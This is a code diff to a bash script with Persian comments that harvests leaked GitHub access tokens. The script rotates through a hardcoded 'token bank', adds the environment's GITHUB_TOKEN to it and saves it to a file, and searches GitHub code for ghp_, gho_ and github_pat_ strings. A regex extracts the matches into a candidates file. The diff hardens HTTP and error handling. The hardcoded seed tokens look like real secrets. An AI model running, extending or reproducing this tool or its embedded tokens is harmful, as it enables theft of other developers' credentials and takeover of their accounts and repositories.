@@ -1,7 +1,7 @@
 #!/bin/bash
 set -euo pipefail
 
-# --- توکن‌های اولیه (seed) که هاردکد هستن ---
+# --- توکن‌های اولیه (seed) ---
 SEED_TOKENS=(
   "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"
   "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"
@@ -31,15 +31,13 @@ save_tokens() {
   printf '%s\n' "$@" | sort -u > "$TOKEN_FILE"
 }
 
-# دریافت سهمیه‌ی یک توکن
 get_remaining() {
   local token="$1"
   curl -sS -H "Authorization: token $token" \
     "https://api.github.com/rate_limit" 2>/dev/null | \
-    jq -r '.resources.core.remaining // .rate.remaining // 0'
+    jq -r '.resources.core.remaining // .rate.remaining // 0' 2>/dev/null || echo 0
 }
 
-# انتخاب بهترین توکن از بین گزینه‌ها (شامل GITHUB_TOKEN اگر موجود باشه)
 pick_best_token() {
   local best_token=""
   local best_rem=-1
@@ -53,7 +51,7 @@ pick_best_token() {
     fi
   done
   if [ -z "$best_token" ] || [ "$best_rem" -eq 0 ]; then
-    echo "ERROR: All tokens have 0 remaining. Wait for rate limit reset." >&2
+    echo "ERROR: All tokens have 0 remaining." >&2
     return 1
   fi
   echo "$best_token"
@@ -63,20 +61,19 @@ pick_best_token() {
 echo "[*] Loading token bank..." >&2
 mapfile -t TOKENS < <(load_tokens)
 
-# تزریق GITHUB_TOKEN در اولویت (اگه در محیط موجود باشه)
+# تزریق GITHUB_TOKEN در اولویت
 if [ -n "${GITHUB_TOKEN:-}" ]; then
   TOKENS=("$GITHUB_TOKEN" "${TOKENS[@]}")
   echo "[*] Injected GITHUB_TOKEN (primary)" >&2
 fi
 
 echo "Loaded ${#TOKENS[@]} tokens." >&2
-save_tokens "${TOKENS[@]}"   # ذخیره‌ی اولیه (بدون GITHUB_TOKEN چون کوتاه‌مدته)
+save_tokens "${TOKENS[@]}"
 
-# انتخاب بهترین توکن برای جستجو
 BEST_TOKEN=$(pick_best_token) || exit 1
 echo "[*] Using token: ${BEST_TOKEN:0:12}..." >&2
 
-# ---- جستجوی کد ----
+# --- جستجوی کد ---
 SEARCH_QUERY='ghp_+OR+gho_+OR+github_pat_'
 MAX_PAGES=10
 PER_PAGE=100
@@ -86,29 +83,36 @@ echo "[*] Starting code search..." >&2
 page=1
 while [ $page -le $MAX_PAGES ]; do
   if [ "$(get_remaining "$BEST_TOKEN")" -lt 1 ]; then
-    echo "[!] Token exhausted, picking a new one..." >&2
+    echo "[!] Token exhausted, picking new one..." >&2
     BEST_TOKEN=$(pick_best_token) || break
   fi
 
   echo "[*] Page $page with ${BEST_TOKEN:0:12}..." >&2
-  response=$(curl -sS -H "Authorization: token $BEST_TOKEN" \
+  # گرفتن هدر HTTP به همراه بدنه با -i (جدا کردنش)
+  http_response=$(curl -sS -i -H "Authorization: token $BEST_TOKEN" \
     -H "Accept: application/vnd.github.text-match+json" \
     "https://api.github.com/search/code?q=$SEARCH_QUERY&per_page=$PER_PAGE&page=$page")
 
-  if [ -z "$response" ]; then
-    echo "[!] Empty response, stopping." >&2
+  # جدا کردن هدر و بدنه
+  http_headers=$(echo "$http_response" | awk 'BEGIN{RS="\r\n\r\n"} NR==1')
+  response_body=$(echo "$http_response" | awk 'BEGIN{RS="\r\n\r\n"} NR>1')
+  http_code=$(echo "$http_headers" | grep -oP '(?<=HTTP\/1\.. )\d+' || echo "000")
+
+  if [ "$http_code" != "200" ]; then
+    echo "[!] HTTP $http_code received. Skipping." >&2
+    # چاپ بخشی از بدنه برای دیباگ
+    echo "Response snippet: ${response_body:0:200}" >&2
     break
   fi
 
-  matches=$(echo "$response" | jq -r '
-    .items[]?.text_matches[]?.fragment // empty
-  ' 2>/dev/null || true)
-
+  # استخراج matches
+  matches=$(echo "$response_body" | jq -r '.items[]?.text_matches[]?.fragment // empty' 2>/dev/null || true)
   if [ -n "$matches" ]; then
     echo "$matches" | grep -oP '\bgh[po]_[A-Za-z0-9_]{36,}\b|\bgithub_pat_[A-Za-z0-9_]{22,}\b' >> "$CANDIDATES_TMP"
   fi
 
-  total=$(echo "$response" | jq -r '.total_count // 0')
+  # استخراج total با محافظت
+  total=$(echo "$response_body" | jq -r '.total_count // 0' 2>/dev/null || echo 0)
   echo "  Total results: $total, extracted fragments: $(echo "$matches" | wc -l)" >&2
 
   if [ $((page * PER_PAGE)) -ge "$total" ]; then
